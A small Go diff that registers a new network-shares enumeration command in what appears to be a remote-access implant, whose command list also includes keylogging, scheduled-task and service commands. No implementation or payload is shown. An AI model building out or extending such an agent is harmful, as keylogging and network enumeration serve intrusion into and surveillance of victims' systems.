@@ -67,6 +67,7 @@ func Initialize() {
 		RegisterCommand(&SchtaskCommand{})
 		RegisterCommand(&ServiceCommand{})
 		RegisterCommand(&NetEnumCommand{})
+		RegisterCommand(&NetSharesCommand{})
 		RegisterCommand(&KeylogCommand{})
 	}
 
